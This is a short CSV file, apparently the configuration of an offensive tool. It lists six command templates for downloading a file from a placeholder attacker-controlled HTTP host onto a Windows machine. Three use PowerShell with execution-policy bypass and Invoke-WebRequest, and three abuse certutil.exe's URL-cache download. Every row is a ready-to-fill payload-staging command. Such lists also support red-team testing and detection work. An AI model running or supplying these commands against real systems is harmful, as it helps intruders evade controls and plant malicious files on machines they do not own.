name,description,command
psIwrHome,Download file using powershell webrequest into home dir,powershell -nop -ep bypass iwr -outfile $env:HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
psIwrTemp,Download file using powershell webrequest into temp dir,powershell -nop -ep bypass iwr -outfile $env:TEMP/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
psIwr,Download file using powershell webrequest into act dir,powershell -nop -ep bypass iwr -outfile $$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
cmdCertutilHome,Download file using cmd / certutil into home dir,cmd /c certutil.exe -urlcache -split -f http://###HttpHost###:###HttpPort###/$$file$$ %HOME%/$$fileName$$
cmdCertutilTemp,Download file using cmd / certutil into temp dir,cmd /c certutil.exe -urlcache -split -f http://###HttpHost###:###HttpPort###/$$file$$ %TEMP%/$$fileName$$
cmdCertutil,Download file using cmd / certutil into act dir,cmd /c certutil.exe -urlcache -split -f http://###HttpHost###:###HttpPort###/$$file$$ $$fileName$$
